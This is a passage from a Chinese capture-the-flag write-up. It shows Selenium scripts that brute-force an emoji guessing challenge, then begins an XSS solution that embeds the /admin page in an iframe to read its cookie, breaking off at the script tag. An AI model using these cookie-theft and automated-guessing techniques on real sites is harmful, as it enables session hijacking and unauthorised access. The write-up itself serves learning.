</span></span><span class="line"><span class="cl"><span class="n">answer</span> <span class="o">=</span> <span class="s1">&#39; &#39;</span> <span class="o">*</span> <span class="mi">64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_or</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">default</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">default</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">emoji</span> <span class="o">=</span> <span class="n">read_or</span><span class="p">(</span><span class="s1">&#39;emoji.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allAnswer</span> <span class="o">=</span> <span class="n">read_or</span><span class="p">(</span><span class="s1">&#39;answer.txt&#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span> <span class="o">*</span> <span class="mi">64</span><span class="p">)</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">emoji</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">emoji</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">emoji</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">answer</span> <span class="o">=</span> <span class="n">allAnswer</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">129</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">guessElement</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">NAME</span><span class="p">,</span> <span class="s1">&#39;guess&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">guessExample</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">NAME</span><span class="p">,</span> <span class="s1">&#39;guess&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get_attribute</span><span class="p">(</span><span class="s1">&#39;placeholder&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">emoji</span> <span class="o">=</span> <span class="n">emoji</span> <span class="o">|</span> <span class="nb">set</span><span class="p">(</span><span class="n">guessExample</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">guess</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">answer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39; &#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">emoji</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="n">guess</span> <span class="o">+=</span> <span class="nb">sorted</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">emoji</span><span class="p">))[</span><span class="n">index</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">guess</span> <span class="o">+=</span> <span class="n">guessExample</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">guess</span> <span class="o">+=</span> <span class="n">answer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ic</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s1">?guess=</span><span class="si">{</span><span class="n">guess</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">.2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># set cookie</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># remove cookie and add cookie</span>
</span></span><span class="line"><span class="cl">    <span class="n">driver</span><span class="o">.</span><span class="n">delete_all_cookies</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">driver</span><span class="o">.</span><span class="n">add_cookie</span><span class="p">(</span><span class="n">cookie</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># find all li</span>
</span></span><span class="line"><span class="cl">    <span class="n">liElements</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_elements</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">TAG_NAME</span><span class="p">,</span> <span class="s1">&#39;li&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">lastLi</span> <span class="o">=</span> <span class="n">liElements</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># 🟩 表示正确</span>
</span></span><span class="line"><span class="cl">    <span class="n">answer</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">correct</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">lastLi</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;🟩&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">answer</span> <span class="o">+=</span> <span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="n">correct</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">answer</span> <span class="o">+=</span> <span class="s1">&#39; &#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">ic</span><span class="p">(</span><span class="n">answer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">ic</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">correct</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;answer.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">answer</span><span class="si">}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">emojiCount</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">emoji</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="n">emojiCount</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">emoji</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">emoji</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;emoji.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">emoji</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">input</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div></details>
<h4 id="level-3">Level 3</h4>
<p>比第二题难在了限制答题时间在 1 分钟内，所以只能猜 60 次左右。</p>
<p>从之前的多次提交中，可以发现不同 emoji 的出现次数有差异。可以统计每个 emoji 出现的次数，按照出现次数从大到小排序，然后按照顺序猜测。</p>
<details open>
<summary>代码</summary>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">selenium</span> <span class="kn">import</span> <span class="n">webdriver</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">selenium.webdriver.common.by</span> <span class="kn">import</span> <span class="n">By</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">icecream</span> <span class="kn">import</span> <span class="n">ic</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://prob14.geekgame.pku.edu.cn/level3&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">driver</span> <span class="o">=</span> <span class="n">webdriver</span><span class="o">.</span><span class="n">Chrome</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">cookie</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">get_cookies</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="n">cookie</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">answer</span> <span class="o">=</span> <span class="s1">&#39; &#39;</span> <span class="o">*</span> <span class="mi">64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_or</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">default</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">default</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">emoji</span> <span class="o">=</span> <span class="n">read_or</span><span class="p">(</span><span class="s1">&#39;emoji.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allAnswer</span> <span class="o">=</span> <span class="n">read_or</span><span class="p">(</span><span class="s1">&#39;answer.txt&#39;</span><span class="p">,</span> <span class="s1">&#39; &#39;</span> <span class="o">*</span> <span class="mi">64</span><span class="p">)</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">emoji</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="n">emoji</span><span class="o">.</span><span class="n">strip</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">emoji</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">answer</span> <span class="o">=</span> <span class="s1">&#39; &#39;</span> <span class="o">*</span> <span class="mi">64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">emojiToCount</span> <span class="o">=</span> <span class="p">{}</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">e</span> <span class="ow">in</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">emoji</span><span class="p">,</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">emojiToCount</span><span class="p">[</span><span class="n">e</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">allAnswer</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">line</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39; &#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">emojiToCount</span><span class="p">[</span><span class="n">line</span><span class="p">[</span><span class="n">i</span><span class="p">]]</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 从大到小排序</span>
</span></span><span class="line"><span class="cl"><span class="n">emojiList</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="n">emojiToCount</span><span class="o">.</span><span class="n">items</span><span class="p">(),</span> <span class="n">key</span><span class="o">=</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">reverse</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="n">emojiList</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">index</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">129</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">guessElement</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">NAME</span><span class="p">,</span> <span class="s1">&#39;guess&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">guessExample</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">NAME</span><span class="p">,</span> <span class="s1">&#39;guess&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">get_attribute</span><span class="p">(</span><span class="s1">&#39;placeholder&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">guess</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">answer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39; &#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">emoji</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">guess</span> <span class="o">+=</span> <span class="n">emojiList</span><span class="p">[</span><span class="n">index</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                    <span class="n">guess</span> <span class="o">+=</span> <span class="n">guessExample</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">guess</span> <span class="o">+=</span> <span class="n">answer</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">ic</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s1">?guess=</span><span class="si">{</span><span class="n">guess</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># set cookie</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># remove cookie and add cookie</span>
</span></span><span class="line"><span class="cl">        <span class="n">driver</span><span class="o">.</span><span class="n">delete_all_cookies</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="n">driver</span><span class="o">.</span><span class="n">add_cookie</span><span class="p">(</span><span class="n">cookie</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># find all li</span>
</span></span><span class="line"><span class="cl">        <span class="n">liElements</span> <span class="o">=</span> <span class="n">driver</span><span class="o">.</span><span class="n">find_elements</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">TAG_NAME</span><span class="p">,</span> <span class="s1">&#39;li&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">lastLi</span> <span class="o">=</span> <span class="n">liElements</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1"># 🟩 表示正确</span>
</span></span><span class="line"><span class="cl">        <span class="n">answer</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">correct</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">64</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">lastLi</span><span class="o">.</span><span class="n">text</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;🟩&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">answer</span> <span class="o">+=</span> <span class="n">guess</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                <span class="n">correct</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">answer</span> <span class="o">+=</span> <span class="s1">&#39; &#39;</span>
</span></span><span class="line"><span class="cl">        <span class="n">ic</span><span class="p">(</span><span class="n">answer</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="n">emojiCount</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">emoji</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">ic</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="n">correct</span><span class="p">,</span> <span class="n">emojiCount</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">correct</span> <span class="o">==</span> <span class="mi">64</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">ic</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">input</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;answer.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">answer</span><span class="si">}</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ic</span><span class="p">(</span><span class="n">emojiCount</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">emoji</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">emoji</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;emoji.txt&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">emoji</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div></details>
<br>
<h3 id="9-第三新xss">9. 第三新XSS</h3>
<h4 id="巡猎">巡猎</h4>
<p>目标是：<code>/admin</code> 下设置了 cookie，需要注册一个链接，去拿出 cookie</p>
<p>如果 <code>X-Frame-Options</code> 设置为 <code>SAMEORIGIN</code>，就能被同源的页面嵌入。本题中没有设置</p>
<p>所以使用 <code>iframe</code> 嵌入，就能获得 <code>/admin</code> 下的 cookie</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span> <span class="p">/&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Parent Page<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;../admin&#34;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;childFrame&#34;</span> <span class="na">width</span><span class="o">=</span><span class="s">&#34;600&#34;</span> <span class="na">height</span><span class="o">=</span><span class="s">&#34;400&#34;</span><span class="p">&gt;</span> <span class="p">&lt;/</span><span class="nt">iframe</span><span class="p">&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
